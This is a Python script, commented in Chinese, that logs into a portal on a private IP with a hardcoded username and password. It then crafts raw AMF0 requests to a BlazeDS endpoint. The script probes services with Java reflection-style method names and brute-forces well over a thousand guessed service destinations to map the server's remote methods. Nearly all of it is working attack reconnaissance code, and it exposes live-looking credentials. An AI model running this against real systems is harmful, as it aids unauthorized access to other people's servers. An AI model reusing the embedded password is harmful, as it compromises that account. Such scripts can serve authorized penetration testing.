"""利用 Java 反射枚举 AMF 服务的所有方法"""
import requests as req
import struct
import re
import json

session = req.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'})

r = session.get('http://172.18.36.5:8000/', timeout=10)
login_url = 'http://172.18.36.5:8000/web/guest/home?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0&_58_struts_action=%2Flogin%2Flogin'
session.post(login_url, data={
    '_58_redirect': '', '_58_rememberMe': 'false',
    '_58_login': 'zhaokw', '_58_password': '`123qwer',
}, timeout=15, allow_redirects=True)
print("登录完成")

AMF_URL = 'http://172.18.36.5:8000/messagebroker/amf'

def build_amf(dest, op, args=None):
    if args is None:
        args = []
    body_items = b''
    for arg in args:
        if isinstance(arg, str):
            b = arg.encode('utf-8')
            body_items += b'\x02' + struct.pack('>H', len(b)) + b
        elif isinstance(arg, (int, float)):
            body_items += b'\x00' + struct.pack('>d', float(arg))
        elif isinstance(arg, bool):
            body_items += b'\x01' + (b'\x01' if arg else b'\x00')
        elif arg is None:
            body_items += b'\x05'
        else:
            body_items += b'\x05'
    body_array = b'\x0A' + struct.pack('>I', len(args)) + body_items
    target = f"{dest}.{op}"
    packet = b'\x00\x00\x00\x00\x00\x01'
    tb = target.encode('utf-8')
    packet += struct.pack('>H', len(tb)) + tb
    packet += struct.pack('>H', 0)
    packet += struct.pack('>I', len(body_array))
    packet += body_array
    return packet

class AMF0Decoder:
    def __init__(self, data):
        self.data = data; self.pos = 0
    def read_u8(self):
        v = self.data[self.pos]; self.pos += 1; return v
    def read_u16(self):
        v = struct.unpack('>H', self.data[self.pos:self.pos+2])[0]; self.pos += 2; return v
    def read_u32(self):
        v = struct.unpack('>I', self.data[self.pos:self.pos+4])[0]; self.pos += 4; return v
    def read_double(self):
        v = struct.unpack('>d', self.data[self.pos:self.pos+8])[0]; self.pos += 8; return v
    def read_string(self):
        length = self.read_u16()
        s = self.data[self.pos:self.pos+length].decode('utf-8', errors='replace')
        self.pos += length; return s
    def read_long_string(self):
        length = self.read_u32()
        s = self.data[self.pos:self.pos+length].decode('utf-8', errors='replace')
        self.pos += length; return s
    def read_value(self):
        type_marker = self.read_u8()
        if type_marker == 0x00: return self.read_double()
        elif type_marker == 0x01: return self.read_u8() != 0
        elif type_marker == 0x02: return self.read_string()
        elif type_marker == 0x03:
            obj = {}
            while True:
                key = self.read_string()
                if len(key) == 0:
                    nb = self.read_u8()
                    if nb == 0x09: break
                    else: self.pos -= 1; continue
                val = self.read_value(); obj[key] = val
            return obj
        elif type_marker == 0x05: return None
        elif type_marker == 0x06: return None
        elif type_marker == 0x08:
            count = self.read_u32(); obj = {}
            for _ in range(count):
                key = self.read_string(); val = self.read_value(); obj[key] = val
            while True:
                key = self.read_string()
                if len(key) == 0:
                    nb = self.read_u8()
                    if nb == 0x09: break
                    else: self.pos -= 1; continue
                val = self.read_value(); obj[key] = val
            return obj
        elif type_marker == 0x09: return '__END__'
        elif type_marker == 0x0A:
            count = self.read_u32(); arr = []
            for _ in range(count): arr.append(self.read_value())
            return arr
        elif type_marker == 0x0B: return self.read_double()
        elif type_marker == 0x0C: return self.read_long_string()
        elif type_marker == 0x10:
            class_name = self.read_string()
            obj = {}
            while True:
                key = self.read_string()
                if len(key) == 0:
                    nb = self.read_u8()
                    if nb == 0x09: break
                    else: self.pos -= 1; continue
                val = self.read_value(); obj[key] = val
            obj['__class_name__'] = class_name
            return obj
        else:
            return f'__UNKNOWN_0x{type_marker:02x}__'

def decode_response(data):
    decoder = AMF0Decoder(data)
    decoder.read_u16()
    header_count = decoder.read_u16()
    for _ in range(header_count):
        decoder.read_string(); decoder.read_u8()
        decoder.read_u32(); decoder.read_value()
    body_count = decoder.read_u16()
    for _ in range(body_count):
        decoder.read_string(); decoder.read_string()
        decoder.read_u32()
        return decoder.read_value()
    return None

def send_amf(dest, op, args=None):
    amf_data = build_amf(dest, op, args)
    resp = session.post(AMF_URL, data=amf_data, headers={'Content-Type': 'application/x-amf'}, timeout=15)
    return decode_response(resp.content)

# ============================================
# 1. 确认已知 destination 的 Java 类名
# ============================================
print("=== 1. 确认 Java 类名 ===")

known_dests = ['userService', 'fileService', 'roleService', 'messageService', 'layoutService', 'workLogService']

for dest in known_dests:
    result = send_amf(dest, 'toString')
    if isinstance(result, str):
        print(f"  {dest} → {result}")

# ============================================
# 2. 利用反射获取方法列表
# ============================================
print("\n=== 2. 利用反射获取方法列表 ===")

# getClass().getName()
for dest in known_dests:
    result = send_amf(dest, 'getClass.getName')
    print(f"  {dest}.getClass().getName(): {result}")

# getClass().getMethods() - 返回方法数组
# 但在 BlazeDS AMF0 中, 链式调用不支持
# 需要: getClass() 返回 Class 对象, 然后在其上调用 getMethods()
# 但 BlazeDS 不支持对象返回值作为下一个调用的目标

# 让我直接尝试调用 getClass.getMethods (链式方法名)
# 在 Java 反射中: obj.getClass().getMethods() 返回 Method[]
# 在 BlazeDS AMF0 中: destination.method 链式调用

print("\n=== 尝试链式反射调用 ===")
for dest in known_dests[:2]:
    # 尝试不同的链式调用方式
    chain_methods = [
        'getClass.getMethods',
        'getClass.getDeclaredMethods',
        'getClass.getName',
        'getClass.getSimpleName',
        'getClass.getCanonicalName',
        'getClass.getMethod',
        'getClass.getFields',
        'getClass.getDeclaredFields',
    ]
    for method in chain_methods:
        result = send_amf(dest, method)
        if result is not None:
            print(f"  {dest}.{method}: {result}")

# ============================================
# 3. 尝试更多 destination (基于 com.cloudtopo.draco 包名)
# ============================================
print("\n=== 3. 基于包名推测更多 destination ===")

# 包路径: com.cloudtopo.draco.user.service.UserRemoteService
# 规律: com.cloudtopo.draco.[module].service.[Entity]RemoteService
# destination = [entity]Service (首字母小写)

# 可能的模块名
modules_and_entities = [
    # devMng 模块
    ('devMng', 'dmBug', 'dmBug'),
    ('devMng', 'dmTask', 'dmTask'),
    ('devMng', 'dmTestCase', 'dmTestCase'),
    ('devMng', 'dmTestRun', 'dmTestRun'),
    ('devMng', 'dmTestSuite', 'dmTestSuite'),
    ('devMng', 'dmTestCaseRun', 'dmTestCaseRun'),
    ('devMng', 'dmRequirement', 'dmRequirement'),
    ('devMng', 'dmRequirementFolder', 'dmRequirementFolder'),
    ('devMng', 'dmSpecification', 'dmSpecification'),
    ('devMng', 'dmVersion', 'dmVersion'),
    ('devMng', 'dmBuild', 'dmBuild'),
    ('devMng', 'dmRelease', 'dmRelease'),
    ('devMng', 'dmRisk', 'dmRisk'),
    ('devMng', 'dmIssue', 'dmIssue'),
    ('devMng', 'dmCodeReview', 'dmCodeReview'),
    ('devMng', 'dmDocReview', 'dmDocReview'),
    ('devMng', 'dmReport', 'dmReport'),
    ('devMng', 'dmProjectReport', 'dmProjectReport'),
    ('devMng', 'dmMeetingNotes', 'dmMeetingNotes'),
    ('devMng', 'dmBudget', 'dmBudget'),
    ('devMng', 'dmCosts', 'dmCosts'),
    ('devMng', 'dmPhase', 'dmPhase'),
    ('devMng', 'dmBaseline', 'dmBaseline'),
    ('devMng', 'dmReview', 'dmReview'),
    ('devMng', 'dmTaskDependency', 'dmTaskDependency'),
    ('devMng', 'dmVersionPhase', 'dmVersionPhase'),
    ('devMng', 'workCalendar', 'workCalendar'),
    ('devMng', 'project', 'project'),
    ('devMng', 'projectFinishReview', 'projectFinishReview'),
    ('devMng', 'projectFoundReview', 'projectFoundReview'),
    # 其他可能
    ('devmng', 'DmBug', 'dmBug'),
    ('test', 'Bug', 'bug'),
    ('test', 'TestCase', 'testCase'),
    ('test', 'TestRun', 'testRun'),
    ('bug', 'Bug', 'bug'),
    ('task', 'Task', 'task'),
    ('project', 'Project', 'project'),
    ('requirement', 'Requirement', 'requirement'),
    ('topo', 'Project', 'topoProject'),
    ('draco', 'Project', 'dracoProject'),
    ('home', 'Home', 'home'),
    ('nav', 'Nav', 'nav'),
    ('nav', 'Navigation', 'navigation'),
    ('stat', 'Statistics', 'statistics'),
    ('stat', 'StatView', 'statView'),
    ('common', 'Common', 'common'),
    ('core', 'Core', 'core'),
    ('base', 'Base', 'base'),
    ('remote', 'Remote', 'remote'),
    ('portal', 'Portal', 'portal'),
    ('system', 'System', 'system'),
    ('data', 'Data', 'data'),
    ('entity', 'Entity', 'entity'),
    ('model', 'Model', 'model'),
    ('query', 'Query', 'query'),
    ('tree', 'Tree', 'tree'),
    ('grid', 'Grid', 'grid'),
    ('form', 'Form', 'form'),
    ('menu', 'Menu', 'menu'),
    ('dashboard', 'Dashboard', 'dashboard'),
    ('config', 'Config', 'config'),
    ('setting', 'Setting', 'setting'),
    ('permission', 'Permission', 'permission'),
    ('department', 'Department', 'department'),
    ('organization', 'Organization', 'organization'),
    ('team', 'Team', 'team'),
    ('group', 'Group', 'group'),
    ('attachment', 'Attachment', 'attachment'),
    ('comment', 'Comment', 'comment'),
    ('log', 'Log', 'log'),
    ('audit', 'Audit', 'audit'),
    ('schedule', 'Schedule', 'schedule'),
    ('calendar', 'Calendar', 'calendar'),
    ('history', 'History', 'history'),
    ('export', 'Export', 'export'),
    ('search', 'Search', 'search'),
    ('workflow', 'Workflow', 'workflow'),
    ('process', 'Process', 'process'),
    ('stat', 'Stat', 'stat'),
    ('chart', 'Chart', 'chart'),
    ('notify', 'Notify', 'notify'),
    ('notification', 'Notification', 'notification'),
    ('email', 'Email', 'email'),
    ('session', 'Session', 'session'),
    ('cache', 'Cache', 'cache'),
    ('sync', 'Sync', 'sync'),
    ('report', 'Report', 'report'),
    ('document', 'Document', 'document'),
    ('doc', 'Doc', 'doc'),
    ('code', 'Code', 'code'),
    ('review', 'Review', 'review'),
    ('risk', 'Risk', 'risk'),
    ('issue', 'Issue', 'issue'),
    ('baseline', 'Baseline', 'baseline'),
    ('version', 'Version', 'version'),
    ('build', 'Build', 'build'),
    ('release', 'Release', 'release'),
    ('phase', 'Phase', 'phase'),
    ('specification', 'Specification', 'specification'),
    ('suite', 'Suite', 'suite'),
    ('step', 'Step', 'step'),
    ('run', 'Run', 'run'),
    ('execution', 'Execution', 'execution'),
    ('environment', 'Environment', 'environment'),
    ('cost', 'Cost', 'cost'),
    ('budget', 'Budget', 'budget'),
    ('meeting', 'Meeting', 'meeting'),
    ('note', 'Note', 'note'),
    ('milestone', 'Milestone', 'milestone'),
    ('tag', 'Tag', 'tag'),
    ('label', 'Label', 'label'),
    ('priority', 'Priority', 'priority'),
    ('severity', 'Severity', 'severity'),
    ('status', 'Status', 'status'),
    ('category', 'Category', 'category'),
]

# 可能的 destination 命名模式
dest_patterns = [
    '{entity}Service',       # dmBugService, projectService
    '{entityLower}Service',  # dmbugservice
    '{entity}RemoteService', # dmBugRemoteService
    '{entityLower}RemoteService',
    '{entity}MngService',
    '{entity}ManageService',
    '{entity}ManagerService',
    '{entity}Controller',
    '{entity}Facade',
    '{entity}Delegate',
    '{entity}Proxy',
    '{module}Service',
    '{module}MngService',
    '{module}ManageService',
    '{module}ManagerService',
]

all_dests = set()
for module, entity, dest_base in modules_and_entities:
    for pattern in dest_patterns:
        dest = pattern.format(entity=entity, entityLower=entity[0].lower() + entity[1:] if entity else '',
                              module=module)
        all_dests.add(dest)

print(f"测试 {len(all_dests)} 个候选 destination...")

found_dests = {}
for dest in sorted(all_dests):
    try:
        result = send_amf(dest, 'toString')
        if isinstance(result, str) and 'cloudtopo' in result:
            print(f"  ✓✓✓ {dest} → {result}")
            found_dests[dest] = result
        elif isinstance(result, dict):
            msg = str(result.get('message', ''))
            if 'No destination' not in msg:
                print(f"  ✓ {dest}: {msg[:150]}")
                found_dests[dest] = msg
    except:
        pass

print(f"\n找到 {len(found_dests)} 个有效 destination:")
for dest, info in sorted(found_dests.items()):
    print(f"  {dest}: {info}")
